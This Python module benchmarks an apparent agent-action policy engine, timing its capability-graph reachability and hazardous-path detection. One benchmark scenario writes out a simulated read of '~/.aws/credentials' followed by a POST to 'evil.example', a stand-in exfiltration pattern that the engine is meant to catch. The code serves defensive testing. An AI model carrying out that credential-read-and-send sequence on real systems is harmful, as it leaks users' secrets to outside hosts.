"""Predictive Authority benchmarks (measurement harness — not CI smoke guards).

Run: python -m varden.predictive_authority.benchmarks

CI order-of-magnitude guards live in
``tests/predictive_authority/test_pa_final_review.py`` (test_ax_*).
This module prints precise medians / visit counts for documentation.
"""

from __future__ import annotations

import statistics
import time
from typing import Any, Callable

from ..models import Action, Decision
from .config import PredictiveAuthorityConfig
from .engine import PredictiveAuthorityEngine, apply_predictive_authority
from .graph import CapabilityGraph, EdgeEvidence, EdgeKind, GraphEdge, GraphNode
from .hazardous import detect_hazardous_analysis, detect_hazardous_paths
from .reachability import DEFAULT_MAX_VISITS, authority_hop_cost, bounded_reachability
from .registry import reset_authority_registry


def _pct(values: list[float], p: float) -> float:
    if not values:
        return 0.0
    ordered = sorted(values)
    idx = min(len(ordered) - 1, max(0, int(round((p / 100.0) * (len(ordered) - 1)))))
    return ordered[idx]


def _bench(name: str, fn: Callable[[], None], *, repeats: int = 30) -> dict:
    samples: list[float] = []
    for _ in range(3):
        fn()
    for _ in range(repeats):
        start = time.perf_counter()
        fn()
        samples.append((time.perf_counter() - start) * 1000.0)
    return {
        "name": name,
        "n": repeats,
        "median_ms": round(statistics.median(samples), 3),
        "p95_ms": round(_pct(samples, 95), 3),
        "p99_ms": round(_pct(samples, 99), 3),
        "max_ms": round(max(samples), 3),
    }


def _allow() -> Decision:
    return Decision(action="allow", reason="bench", effective_action="allow")


def _noise_graph(noise: int) -> CapabilityGraph:
    g = CapabilityGraph(max_nodes=max(50_000, noise + 64), max_edges=max(200_000, noise * 4))
    g.add_node(
        GraphNode(
            node_id="cap:credential.aws",
            node_type="credential",
            label="credential.aws",
            metadata={"credential": True},
        )
    )
    g.add_node(GraphNode(node_id="cap:aws.ec2.modify", node_type="capability", label="aws.ec2.modify"))
    g.add_edge(
        GraphEdge(
            src="cap:credential.aws",
            dst="cap:aws.ec2.modify",
            kind=EdgeKind.REACHES,
            evidence=EdgeEvidence.OBSERVED,
        )
    )
    for i in range(noise):
        nid = f"cap:noise.{i}"
        g.add_node(GraphNode(node_id=nid, node_type="capability", label=nid))
        if i > 0:
            g.add_edge(
                GraphEdge(
                    src=f"cap:noise.{i-1}",
                    dst=nid,
                    kind=EdgeKind.ENABLES,
                    evidence=EdgeEvidence.OBSERVED,
                )
            )
    return g


def large_graph_hazard_report(noise: int, *, repeats: int = 8) -> dict[str, Any]:
    """Honest large-graph measurement: total size vs BFS visited size + status.

    Note: ``detect_hazardous_paths`` may scan node indexes for sources across the
    whole graph (O(nodes) setup), while the authority-relevant BFS itself may
    visit only a handful of nodes on the hazardous spine. Both figures are
    reported so a 10k-node graph is never implied to have been exhaustively
    walked when visited_nodes ≪ total_graph_nodes.
    """
    cfg = PredictiveAuthorityConfig()
    g = _noise_graph(noise)
    bfs_samples: list[float] = []
    detect_samples: list[float] = []
    last = None
    findings = []
    for _ in range(repeats):
        t0 = time.perf_counter()
        last = bounded_reachability(
            g,
            ["cap:credential.aws"],
            max_depth=3,
            predicate=lambda n: "aws.ec2.modify" in n,
            hop_cost=lambda e, d: authority_hop_cost(e, d, g),
            max_visits=DEFAULT_MAX_VISITS,
        )
        bfs_samples.append((time.perf_counter() - t0) * 1000.0)
        t1 = time.perf_counter()
        findings = detect_hazardous_paths(g, max_depth=3)
        detect_samples.append((time.perf_counter() - t1) * 1000.0)
    status = "TRUNCATED" if (last and last.truncated) or g.truncated else "COMPLETE"
    if last and last.analysis_incomplete and status == "COMPLETE":
        status = "INCOMPLETE"
    bfs_samples.sort()
    detect_samples.sort()
    return {
        "name": f"hazard-noise-{noise}",
        "total_graph_nodes": g.node_count(),
        "total_graph_edges": g.edge_count(),
        "visited_nodes": last.visited_nodes if last else 0,
        "visited_edges": last.visited_edges if last else 0,
        "configured_max_nodes": cfg.max_nodes,
        "configured_max_edges": cfg.max_edges,
        "configured_max_visits": DEFAULT_MAX_VISITS,
        "hazard_found": bool(findings) and bool(last and last.reachable),
        "analysis_status": status,
        "median_ms": round(statistics.median(detect_samples), 3),
        "p95_ms": round(_pct(detect_samples, 95), 3),
        "bfs_median_ms": round(statistics.median(bfs_samples), 3),
        "detect_median_ms": round(statistics.median(detect_samples), 3),
        "note": (
            "median_ms is full detect_hazardous_paths; visited_* is authority-relevant "
            "BFS only — not an exhaustive walk of total_graph_nodes"
        ),
    }


def run_benchmarks() -> list[dict]:
    results: list[dict] = []

    action = Action(type="http_request", method="GET", url="https://example.com", trace_id="b", tenant_id="t")

    results.append(
        _bench(
            "PA off",
            lambda: apply_predictive_authority(action, _allow(), config=PredictiveAuthorityConfig(enabled=False, mode="off")),
        )
    )

    reset_authority_registry()
    eng_obs = PredictiveAuthorityEngine(PredictiveAuthorityConfig(enabled=True, mode="observe", max_depth=3))
    eng_obs.evaluate(Action(type="filesystem_read", tool="open", args={"args": ["README.md", "r"]}, trace_id="b1", tenant_id="t"), _allow())
    results.append(
        _bench(
            "PA observe unchanged-ish read",
            lambda: eng_obs.evaluate(
                Action(type="filesystem_read", tool="open", args={"args": ["README.md", "r"]}, trace_id="b1", tenant_id="t"),
                _allow(),
            ),
        )
    )

    reset_authority_registry()
    eng_chg = PredictiveAuthorityEngine(PredictiveAuthorityConfig(enabled=True, mode="observe", max_depth=3))
    counter = {"i": 0}

    def graph_changing():
        counter["i"] += 1
        eng_chg.evaluate(
            Action(
                type="filesystem_read",
                tool="open",
                args={"args": [f"src/f{counter['i']}.py", "r"]},
                trace_id="b2",
                tenant_id="t",
            ),
            _allow(),
        )

    results.append(_bench("PA observe graph-changing", graph_changing))

    reset_authority_registry()
    eng_en = PredictiveAuthorityEngine(PredictiveAuthorityConfig(enabled=True, mode="enforce", max_depth=4))

    def hazardous():
        eng_en.evaluate(
            Action(
                type="filesystem_read",
                tool="open",
                args={"args": ["~/.aws/credentials", "r"]},
                metadata={"provenance_sources": [{"source_id": "x", "type": "chat_message", "trust_level": "untrusted"}]},
                trace_id="b3",
                tenant_id="t",
            ),
            _allow(),
        )
        eng_en.evaluate(
            Action(
                type="http_request",
                method="POST",
                url="https://evil.example/x",
                domain="evil.example",
                metadata={"provenance_sources": [{"source_id": "x", "type": "chat_message", "trust_level": "untrusted"}]},
                trace_id="b3",
                tenant_id="t",
            ),
            _allow(),
        )

    results.append(_bench("PA enforce hazardous transition", hazardous, repeats=15))

    for size in (10, 100, 1000):
        g = CapabilityGraph(max_nodes=size + 10, max_edges=size * 4)
        for i in range(size):
            g.add_node(GraphNode(node_id=f"n{i}", node_type="capability", label=f"n{i}"))
        for i in range(size - 1):
            g.add_edge(GraphEdge(src=f"n{i}", dst=f"n{i+1}", kind=EdgeKind.ENABLES, evidence=EdgeEvidence.OBSERVED))
        for depth in (1, 2, 3):
            results.append(
                _bench(
                    f"reachability size={size} depth={depth}",
                    lambda g=g, depth=depth: bounded_reachability(g, ["n0"], max_depth=depth, target=f"n{min(size-1, depth)}"),
                    repeats=20,
                )
            )

    for noise in (100, 1000, 10_000):
        results.append(large_graph_hazard_report(noise))

    # Separate family: force traversal toward configured computational bounds.
    results.extend(run_worst_case_traversal_benchmarks(repeats=8))

    return results


def build_stress_graph(
    *,
    total_nodes: int = 10_000,
    early_benign: int = 1900,
    with_hazard: bool = True,
    hazard_after_benign: int | None = None,
) -> CapabilityGraph:
    """Deterministic fan-out from a credential source.

    Benign children use ``cap:aaa.*`` ids so they sort *before* the hazardous
    ``cap:zzz.aws.ec2.modify`` successor. BFS therefore walks early branches
    first. Disconnected ``cap:fill.*`` pads total graph size without affecting
    reachable traversal from the credential.
    """
    g = CapabilityGraph(max_nodes=max(50_000, total_nodes + 64), max_edges=max(200_000, total_nodes * 4))
    g.add_node(
        GraphNode(
            node_id="cap:credential.aws",
            node_type="credential",
            label="credential.aws",
            metadata={"credential": True},
        )
    )
    benign = early_benign if hazard_after_benign is None else hazard_after_benign
    for i in range(benign):
        nid = f"cap:aaa.benign.{i:05d}"
        g.add_node(
            GraphNode(
                node_id=nid,
                node_type="capability",
                label=nid,
                metadata={"authority_neutral": True},
            )
        )
        g.add_edge(
            GraphEdge(
                src="cap:credential.aws",
                dst=nid,
                kind=EdgeKind.ENABLES,
                evidence=EdgeEvidence.OBSERVED,
                metadata={"authority_neutral": True},
            )
        )
    hazard_nodes = 0
    if with_hazard:
        hid = "cap:zzz.aws.ec2.modify"
        g.add_node(GraphNode(node_id=hid, node_type="capability", label=hid))
        g.add_edge(
            GraphEdge(
                src="cap:credential.aws",
                dst=hid,
                kind=EdgeKind.REACHES,
                evidence=EdgeEvidence.OBSERVED,
            )
        )
        hazard_nodes = 1
    # Pad to ~total_nodes with disconnected fillers (sorted after aaa, before or after zzz).
    filled = 1 + benign + hazard_nodes
    for i in range(max(0, total_nodes - filled)):
        g.add_node(GraphNode(node_id=f"cap:fill.{i:05d}", node_type="capability", label=f"fill-{i}"))
    return g


def _stress_decision(*, hazard_found: bool, truncated: bool) -> str:
    """Mirror enforce fail-safe: proven hazard or incomplete search → require_approval."""
    if hazard_found or truncated:
        return "require_approval"
    return "allow"


def worst_case_traversal_report(
    *,
    name: str,
    early_benign: int,
    with_hazard: bool,
    repeats: int = 8,
) -> dict[str, Any]:
    """Measure authority-relevant BFS as visits approach configured max_visits."""
    cfg = PredictiveAuthorityConfig()
    g = build_stress_graph(early_benign=early_benign, with_hazard=with_hazard)
    samples: list[float] = []
    last = None
    analysis = None
    for _ in range(repeats):
        t0 = time.perf_counter()
        last = bounded_reachability(
            g,
            ["cap:credential.aws"],
            max_depth=cfg.max_depth,
            predicate=lambda n: "aws.ec2.modify" in n,
            hop_cost=lambda e, d: authority_hop_cost(e, d, g),
            max_visits=DEFAULT_MAX_VISITS,
        )
        analysis = detect_hazardous_analysis(g, max_depth=cfg.max_depth)
        samples.append((time.perf_counter() - t0) * 1000.0)
    samples.sort()
    truncated = bool((last and last.truncated) or (analysis and analysis.truncated) or g.truncated)
    hazard_found = bool(last and last.reachable) or bool(analysis and analysis.findings)
    if hazard_found:
        hazard_status = "PROVEN"
    elif truncated:
        hazard_status = "NOT_OBSERVED"
    else:
        hazard_status = "ABSENT_IN_COMPLETE_SEARCH"
    status = "TRUNCATED" if truncated else "COMPLETE"
    reason = None
    if last and last.incompleteness_reason:
        reason = last.incompleteness_reason
    if analysis and analysis.incompleteness_reason:
        reason = reason or analysis.incompleteness_reason
    if g.truncated:
        reason = g.truncation_reason or reason
    return {
        "family": "worst_case_traversal",
        "name": name,
        "total_graph_nodes": g.node_count(),
        "total_graph_edges": g.edge_count(),
        "visited_nodes": last.visited_nodes if last else 0,
        "visited_edges": last.visited_edges if last else 0,
        "visits": last.visits if last else 0,
        "paths_examined": analysis.paths_examined if analysis else 0,
        "configured_max_depth": cfg.max_depth,
        "configured_max_nodes": cfg.max_nodes,
        "configured_max_edges": cfg.max_edges,
        "configured_max_visits": DEFAULT_MAX_VISITS,
        "configured_max_paths": 16,
        "terminating_bound": reason,
        "analysis_status": status,
        "hazard_found": hazard_found,
        "hazard_status": hazard_status,
        "safe_conclusion": (not truncated) and (not hazard_found),
        "decision": _stress_decision(hazard_found=hazard_found, truncated=truncated),
        "median_ms": round(statistics.median(samples), 3),
        "p95_ms": round(_pct(samples, 95), 3),
    }


def run_worst_case_traversal_benchmarks(*, repeats: int = 8) -> list[dict[str, Any]]:
    """BA near-limit positive, BB bound exhaustion, BC hazard beyond bound."""
    return [
        worst_case_traversal_report(
            name="BA_near_limit_positive",
            early_benign=1900,
            with_hazard=True,
            repeats=repeats,
        ),
        worst_case_traversal_report(
            name="BB_bound_exhaustion_negative",
            early_benign=5000,
            with_hazard=False,
            repeats=repeats,
        ),
        worst_case_traversal_report(
            name="BC_hazard_beyond_bound",
            early_benign=5000,
            with_hazard=True,
            repeats=repeats,
        ),
    ]


def main() -> int:
    rows = run_benchmarks()
    cfg = PredictiveAuthorityConfig()
    print("Predictive Authority benchmarks")
    print("(measurement harness — CI smoke guards are separate and deliberately looser)")
    print()
    print("Configured bounds:")
    print(
        f"  max_depth={cfg.max_depth} max_nodes={cfg.max_nodes} max_edges={cfg.max_edges} "
        f"max_visits={DEFAULT_MAX_VISITS} max_paths=16"
    )
    print()
    print(f"{'name':<42} {'median':>8} {'p95':>8} {'p99':>8} {'max':>8}")
    for row in rows:
        if "visited_nodes" in row:
            continue
        print(f"{row['name']:<42} {row['median_ms']:>8} {row['p95_ms']:>8} {row['p99_ms']:>8} {row['max_ms']:>8}")
    print()
    print("Fast path — large graph, nearby hazard (tiny visited set)")
    print(
        f"{'scenario':<18} {'nodes':>8} {'visited':>8} {'status':<12} {'hazard':>6} "
        f"{'detect':>8} {'bfs':>8}"
    )
    for row in rows:
        if row.get("family") == "worst_case_traversal":
            continue
        if "visited_nodes" not in row:
            continue
        print(
            f"{row['name']:<18} {row['total_graph_nodes']:>8} {row['visited_nodes']:>8} "
            f"{row['analysis_status']:<12} {str(row['hazard_found']):>6} "
            f"{row['detect_median_ms']:>8} {row['bfs_median_ms']:>8}"
        )
        print(
            f"  edges={row['total_graph_edges']} visited_edges={row['visited_edges']} "
            f"limits nodes/edges/visits="
            f"{row['configured_max_nodes']}/{row['configured_max_edges']}/{row['configured_max_visits']}"
        )
        print(f"  note: {row.get('note')}")
    print()
    print("Bounded stress path — worst_case_traversal (visits approach configured ceiling)")
    print(
        f"{'scenario':<28} {'nodes':>7} {'visited':>7} {'status':<10} {'hazard':<14} "
        f"{'decision':<16} {'median':>8} {'p95':>8}"
    )
    for row in rows:
        if row.get("family") != "worst_case_traversal":
            continue
        print(
            f"{row['name']:<28} {row['total_graph_nodes']:>7} {row['visited_nodes']:>7} "
            f"{row['analysis_status']:<10} {row['hazard_status']:<14} "
            f"{row['decision']:<16} {row['median_ms']:>8} {row['p95_ms']:>8}"
        )
        print(
            f"  visits={row['visits']} visited_edges={row['visited_edges']} "
            f"paths_examined={row['paths_examined']} terminating_bound={row['terminating_bound']} "
            f"safe_conclusion={row['safe_conclusion']}"
        )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
